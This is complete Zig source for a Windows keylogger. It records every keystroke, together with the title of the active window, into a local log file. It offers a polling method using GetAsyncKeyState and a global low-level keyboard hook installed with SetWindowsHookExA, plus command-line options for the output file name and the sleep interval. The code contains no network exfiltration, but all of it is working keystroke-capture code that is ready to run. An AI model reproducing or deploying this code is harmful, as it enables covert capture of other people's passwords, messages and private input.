const build_options = @import("build_options");
const c = @import("c");
const std = @import("std");
const Allocator = std.mem.Allocator;
const Io = std.Io;
const Writer = std.Io.Writer;
const eql = std.mem.eql;
const f = std.fmt.bufPrint;
const print = std.debug.print;
const parseInt = std.fmt.parseInt;

const win = std.os.windows;
// std.os.windows (0.17) lacks these message-type integers; define them here.
const WPARAM = usize; // UINT_PTR
const LPARAM = isize; // LONG_PTR
const LRESULT = isize; // LONG_PTR
extern "user32" fn GetForegroundWindow() callconv(.winapi) ?win.HWND;
extern "user32" fn GetAsyncKeyState(vKey: i32) callconv(.winapi) i16;
extern "user32" fn GetWindowTextA(hwnd: win.HWND, lpString: [*]u8, nMaxCount: i32) callconv(.winapi) i32;

// Low-level keyboard hook API (used by the "hook" method).
const HHOOK = *opaque {};
const HOOKPROC = *const fn (c_int, WPARAM, LPARAM) callconv(.winapi) LRESULT;
extern "user32" fn SetWindowsHookExA(idHook: c_int, lpfn: HOOKPROC, hmod: ?win.HINSTANCE, dwThreadId: win.DWORD) callconv(.winapi) ?HHOOK;
extern "user32" fn UnhookWindowsHookEx(hhk: HHOOK) callconv(.winapi) win.BOOL;
extern "user32" fn CallNextHookEx(hhk: ?HHOOK, nCode: c_int, wParam: WPARAM, lParam: LPARAM) callconv(.winapi) LRESULT;
// Returns i32 (not BOOL): -1 on error, 0 on WM_QUIT, nonzero otherwise.
extern "user32" fn GetMessageA(lpMsg: *MSG, hWnd: ?win.HWND, wMsgFilterMin: win.UINT, wMsgFilterMax: win.UINT) callconv(.winapi) i32;
extern "user32" fn TranslateMessage(lpMsg: *const MSG) callconv(.winapi) win.BOOL;
extern "user32" fn DispatchMessageA(lpMsg: *const MSG) callconv(.winapi) LRESULT;

const WH_KEYBOARD_LL: c_int = 13;
const HC_ACTION: c_int = 0;
const WM_KEYDOWN: WPARAM = 0x0100;
const WM_SYSKEYDOWN: WPARAM = 0x0104;

const KBDLLHOOKSTRUCT = extern struct {
    vkCode: win.DWORD,
    scanCode: win.DWORD,
    flags: win.DWORD,
    time: win.DWORD,
    dwExtraInfo: usize,
};

const POINT = extern struct { x: win.LONG, y: win.LONG };
const MSG = extern struct {
    hwnd: ?win.HWND,
    message: win.UINT,
    wParam: WPARAM,
    lParam: LPARAM,
    time: win.DWORD,
    pt: POINT,
    lPrivate: win.DWORD,
};

const PrevType = enum {
    init,
    window,
    key,
};

// Shared state for the hook callback. The low-level keyboard hook runs on the
// same thread that pumps the message loop (main), so no synchronization is
// needed. Populated in main() before the hook is installed.
const Globals = struct {
    io_writer: *Writer,
    stdout: *Writer,
    stderr: *Writer,
    verbose: u8,
    title_len_i: c_uint,
    ctitle_b: []u8,
    ptitle_b: []u8,
    key_name_b: []u8,
    prev_type: PrevType,
    file_exists: bool,
};
var globals: Globals = undefined;

const base_help =
    \\Usage: keylogger.exe [<options>]
    \\
    \\Options:
    \\-h, --help                Print this help.
    \\-v, --verbose             Verbose output.
    \\-o, --output <path>       Output file path. Accepts datetime format. Default: keylogger.log
    \\-d, --date                Will use date and time in the default output filename. Default: keylogger_%Y%m%d_%H%M%S.log
;
const sleep_help =
    \\
    \\-s, --sleep <msec>        Time to sleep in milliseconds (loop method only). Default: 10
;
const usage = base_help ++ if (build_options.METHOD == .loop)
    sleep_help
else
    "";

const Args = struct {
    verbose: u8 = 0,
    use_date: bool = false,
    sleep: i64 = 10,
    output_format1: std.ArrayList(u8),
    output_format2: []u8,
    output_path_b: []u8,
    output_path_s: []u8 = undefined,
    output_path_l: usize = undefined,
};
const ArgError = error{
    InvalidArgs,
    MissingValue,
    HelpRequested,
} || Allocator.Error || std.fmt.ParseIntError;

const ArgsStatus = struct {
    arg: []const u8 = "",
};
var args_status: ArgsStatus = .{};

fn parseArgs(gpa: Allocator, io: Io, argv: std.process.Args) ArgError!Args {
    var args_iter = try argv.iterateAllocator(gpa);
    defer args_iter.deinit();
    _ = args_iter.next();

    var args: Args = .{
        .output_format1 = try .initCapacity(gpa, 1024),
        .output_format2 = try gpa.allocSentinel(u8, 1024, 0),
        .output_path_b = try gpa.alloc(u8, 1024),
    };
    while (args_iter.next()) |arg| {
        if (eql(u8, arg, "-h") or eql(u8, arg, "--help")) {
            return error.HelpRequested;
        } else if (eql(u8, arg, "-v") or eql(u8, arg, "--verbose")) {
            args.verbose += 1;
        } else if (eql(u8, arg, "-vv")) {
            args.verbose = 2;
        } else if (eql(u8, arg, "-o") or eql(u8, arg, "--output")) {
            if (args_iter.next()) |next_arg| {
                args.output_format1.clearRetainingCapacity();
                try args.output_format1.appendSlice(gpa, next_arg);
            } else {
                args_status.arg = arg;
                return error.MissingValue;
            }
        } else if (eql(u8, arg, "-d") or eql(u8, arg, "--date")) {
            args.use_date = true;
        } else if (build_options.METHOD == .loop and (eql(u8, arg, "-s") or eql(u8, arg, "--sleep"))) {
            if (args_iter.next()) |next_arg| {
                args.sleep = try parseInt(i64, next_arg, 10);
                if (args.sleep < 10) {
                    args.sleep = 10;
                }
            } else {
                args_status.arg = arg;
                return error.MissingValue;
            }
        } else {
            print("ERROR: unrecognized argument: {s}\n", .{arg});
            return error.InvalidArgs;
        }
    }

    if (args.output_format1.items.len == 0) {
        if (args.use_date) {
            try args.output_format1.appendSlice(gpa, "keylogger_%Y%m%d_%H%M%S.log");
        } else {
            try args.output_format1.appendSlice(gpa, "keylogger.log");
        }
    }

    const len = @min(args.output_format1.items.len, args.output_path_b.len - 1);
    @memcpy(args.output_format2[0..len], args.output_format1.items[0..len]);
    args.output_format2[len] = 0;

    const now = Io.Clock.real.now(io).toSeconds();
    const now_lt = c.localtime(&now);

    args.output_path_l = c.strftime(args.output_path_b.ptr, 1024, args.output_format2.ptr, now_lt);
    args.output_path_s = args.output_path_b[0..args.output_path_l];

    return args;
}

pub fn main(init: std.process.Init) !u8 {
    const gpa = init.arena.allocator();
    const io = init.io;

    const stdout_buffer = try gpa.alloc(u8, 1024);
    defer gpa.free(stdout_buffer);
    var stdout_writer = std.Io.File.stdout().writer(io, stdout_buffer);
    const stdout = &stdout_writer.interface;

    const stderr_buffer = try gpa.alloc(u8, 1024);
    defer gpa.free(stderr_buffer);
    var stderr_writer = std.Io.File.stderr().writer(io, stderr_buffer);
    const stderr = &stderr_writer.interface;

    const args = parseArgs(gpa, io, init.minimal.args) catch |err| switch (err) {
        error.HelpRequested => {
            try printHeader(stdout);
            try stdout.print(usage ++ "\n", .{});
            try stdout.flush();
            return 0;
        },
        error.InvalidArgs => {
            return 1;
        },
        error.MissingValue => {
            print("ERROR: argument {s} is missing a value\n", .{args_status.arg});
            return 1;
        },
        else => return err,
    };

    if (args.verbose >= 1) {
        try printHeader(stdout);
        try stdout.print("method: {s}\n", .{@tagName(build_options.METHOD)});
        try stdout.print("output format: '{s}'\n", .{args.output_format1.items});
        try stdout.print("output path:   '{s}'\n", .{args.output_path_s});
        try stdout.flush();
    }

    var file = try std.Io.Dir.cwd().createFile(io, args.output_path_s, .{
        .truncate = false,
        .read = true,
    });
    defer file.close(io); // Actually never reached because of the loop below.

    const writer_buf = try gpa.alloc(u8, 1024);
    defer gpa.free(writer_buf);
    var file_writer = file.writer(io, writer_buf);
    const io_writer = &file_writer.interface;

    // Append to end.
    const stat = try file.stat(io);
    const file_exists = stat.size > 0;
    try file_writer.seekTo(stat.size);

    if (args.verbose >= 1) {
        try stdout.print("output file size: {d}\n", .{stat.size});
        try stdout.print("output file exists: {any}\n", .{file_exists});
        try stdout.flush();
    }

    const title_len: usize = 1024;
    const title_len_i: c_uint = @intCast(title_len - 1);
    const ctitle_b = try gpa.alloc(u8, title_len);
    const ptitle_b = try gpa.alloc(u8, title_len);

    const key_len: usize = 255;
    const key_name_b = try gpa.alloc(u8, key_len);

    for (0..title_len) |n| {
        ctitle_b[n] = 0;
        ptitle_b[n] = 0;
    }
    for (0..key_len) |n| key_name_b[n] = 0;

    switch (build_options.METHOD) {
        .loop => {
            var prev_type: PrevType = .init;
            while (true) {
                try init.io.sleep(.fromMilliseconds(args.sleep), .real);

                const hwnd: win.HWND = GetForegroundWindow() orelse continue;
                const ctitle_len = GetWindowTextA(hwnd, ctitle_b.ptr, @intCast(title_len_i));
                const ctitle_len_u: usize = @intCast(ctitle_len);
                const ctitle_s: []u8 = ctitle_b[0..ctitle_len_u];

                if (!eql(u8, ptitle_b, ctitle_b)) {
                    if (args.verbose >= 1) {
                        try stdout.print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
                        try stdout.flush();
                    }
                    switch (prev_type) {
                        .init => {
                            if (file_exists) {
                                try io_writer.writeAll("\n");
                            }
                        },
                        .window => {},
                        .key => try io_writer.writeAll("\n"),
                    }
                    try io_writer.writeAll("window: '");
                    try io_writer.writeAll(ctitle_s);
                    try io_writer.writeAll("'\n");
                    try io_writer.flush();
                    @memcpy(ptitle_b, ctitle_b);
                    prev_type = .window;
                }

                var key_i: u8 = 1;
                while (key_i < 255) : (key_i += 1) {
                    const key_state: win.SHORT = GetAsyncKeyState(key_i);
                    if (key_state & 1 != 0) {
                        const key_name_s = try getKeyName(key_name_b, key_i);
                        if (args.verbose >= 1) {
                            try stdout.print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
                            try stdout.flush();
                        }
                        try io_writer.writeAll(key_name_s);
                        try io_writer.flush();
                        prev_type = .key;
                    }
                }
            }
        },
        .hook => {
            // Publish state for the hook callback, then install the hook.
            globals = .{
                .io_writer = io_writer,
                .stdout = stdout,
                .stderr = stderr,
                .verbose = args.verbose,
                .title_len_i = title_len_i,
                .ctitle_b = ctitle_b,
                .ptitle_b = ptitle_b,
                .key_name_b = key_name_b,
                .prev_type = .init,
                .file_exists = file_exists,
            };
            if (args.verbose >= 1) {
                try stdout.print("setup hook\n", .{});
                try stdout.flush();
            }
            const hook = SetWindowsHookExA(WH_KEYBOARD_LL, &lowLevelKeyboardProc, null, 0) orelse {
                try stderr.print("ERROR: SetWindowsHookExA failed\n", .{});
                try stderr.flush();
                return 1;
            };
            defer _ = UnhookWindowsHookEx(hook);

            if (args.verbose >= 1) {
                try stdout.print("main wait\n", .{});
                try stdout.flush();
            }

            // Pump the message queue. The low-level keyboard hook is dispatched by
            // the OS while this thread waits in GetMessage; zero CPU when idle.
            var msg: MSG = undefined;
            while (GetMessageA(&msg, null, 0, 0) > 0) {
                try stdout.print("main GetMessageA\n", .{});
                try stdout.flush();

                _ = TranslateMessage(&msg);
                _ = DispatchMessageA(&msg);
            }
        },
    }

    try io_writer.flush();
    try file_writer.flush();

    return 0;
}

// Low-level keyboard hook callback. Runs on the main thread during GetMessage.
fn lowLevelKeyboardProc(nCode: c_int, wParam: WPARAM, lParam: LPARAM) callconv(.winapi) LRESULT {
    if (nCode == HC_ACTION and (wParam == WM_KEYDOWN or wParam == WM_SYSKEYDOWN)) {
        const kb: *const KBDLLHOOKSTRUCT = @ptrFromInt(@as(usize, @bitCast(lParam)));
        const ki: u8 = @truncate(kb.vkCode);
        handleKey(ki) catch {};
    }
    return CallNextHookEx(null, nCode, wParam, lParam);
}

// Log one key press, writing a window header first when the foreground window
// changed since the last recorded key.
fn handleKey(ki: u8) !void {
    const hwnd: win.HWND = GetForegroundWindow() orelse return;
    const ctitle_len = GetWindowTextA(hwnd, globals.ctitle_b.ptr, @intCast(globals.title_len_i));
    const ctitle_len_u: usize = @intCast(ctitle_len);
    const ctitle_s: []u8 = globals.ctitle_b[0..ctitle_len_u];

    if (!eql(u8, globals.ptitle_b, globals.ctitle_b)) {
        if (globals.verbose >= 1) {
            try globals.stdout.print("window: ({d}) '{s}' \n", .{ ctitle_len_u, ctitle_s });
            try globals.stdout.flush();
        }
        switch (globals.prev_type) {
            .init => {
                if (globals.file_exists) {
                    try globals.io_writer.writeAll("\n");
                }
            },
            .window => {},
            .key => try globals.io_writer.writeAll("\n"),
        }
        try globals.io_writer.writeAll("window: '");
        try globals.io_writer.writeAll(ctitle_s);
        try globals.io_writer.writeAll("'\n");
        try globals.io_writer.flush();
        @memcpy(globals.ptitle_b, globals.ctitle_b);
        globals.prev_type = .window;
    }

    const key_name_s = try getKeyName(globals.key_name_b, ki);
    if (globals.verbose >= 1) {
        try globals.stdout.print("key: '{s}' ({d})\n", .{ key_name_s, ki });
        try globals.stdout.flush();
    }
    try globals.io_writer.writeAll(key_name_s);
    try globals.io_writer.flush();
    globals.prev_type = .key;
}

fn printHeader(stdout: *Writer) !void {
    try stdout.print("Keylogger " ++ build_options.VERSION ++ "\n", .{});
    try stdout.print("Copyright (C) 2009 Christian Mayer <https://fox21.at>\n\n", .{});
    try stdout.flush();
}

fn getKeyName(kn: []u8, ki: u8) ![]u8 {
    return try switch (ki) {
        1 => f(kn, "[LMOUSE]", .{}),
        2 => f(kn, "[RMOUSE]", .{}),
        4 => f(kn, "[MMOUSE]", .{}),
        8 => f(kn, "[BACKSPACE]", .{}),
        9 => f(kn, "[TAB]", .{}),
        13 => f(kn, "[RETURN]", .{}),
        16 => f(kn, "[SHIFT]", .{}),
        17 => f(kn, "[CONTROL]", .{}),
        18 => f(kn, "[ALT]", .{}),
        19 => f(kn, "[PAUSE]", .{}),
        20 => f(kn, "[CAPS LOCK]", .{}),
        27 => f(kn, "[ESC]", .{}),
        32 => f(kn, "[SPACE]", .{}),
        33 => f(kn, "[PAGE UP]", .{}),
        34 => f(kn, "[PAGE DOWN]", .{}),
        35 => f(kn, "[END]", .{}),
        36 => f(kn, "[HOME]", .{}),
        37 => f(kn, "[ARROW LEFT]", .{}),
        38 => f(kn, "[ARROW UP]", .{}),
        39 => f(kn, "[ARROW RIGHT]", .{}),
        40 => f(kn, "[ARROW DOWN]", .{}),
        44 => f(kn, "[PRINT]", .{}),
        45 => f(kn, "[INS]", .{}),
        46 => f(kn, "[DEL]", .{}),
        48...57 => f(kn, "{d}", .{ki - 48}),
        65...90 => f(kn, "{c}", .{ki}),
        91, 92 => f(kn, "[WIN]", .{}),
        96...105 => f(kn, "[NUM {d}]", .{ki - 96}),
        106 => f(kn, "[NUM *]", .{}),
        107 => f(kn, "[NUM +]", .{}),
        109 => f(kn, "[NUM -]", .{}),
        110 => f(kn, "[NUM ,]", .{}),
        111 => f(kn, "[NUM /]", .{}),
        112...135 => f(kn, "[F{d}]", .{ki - 111}),
        144 => f(kn, "[NUM]", .{}),
        145 => f(kn, "[ROLL]", .{}),
        160, 161 => f(kn, "[SHIFT]", .{}),
        162, 163 => f(kn, "[STRG]", .{}),
        164 => f(kn, "[ALT]", .{}),
        165 => f(kn, "[ALT GR]", .{}),
        186 => f(kn, "[UE]", .{}), // ü
        187 => f(kn, "+", .{}),
        188 => f(kn, ",", .{}),
        189 => f(kn, "-", .{}),
        190 => f(kn, ".", .{}),
        191 => f(kn, "#", .{}),
        192 => f(kn, "[OE]", .{}), // ö
        219 => f(kn, "[SS]", .{}), // ß
        220 => f(kn, "^", .{}),
        222 => f(kn, "[AE]", .{}), // ä
        226 => f(kn, "<", .{}),
        else => f(kn, "[KEY \\{d}]", .{ki}),
    };
}
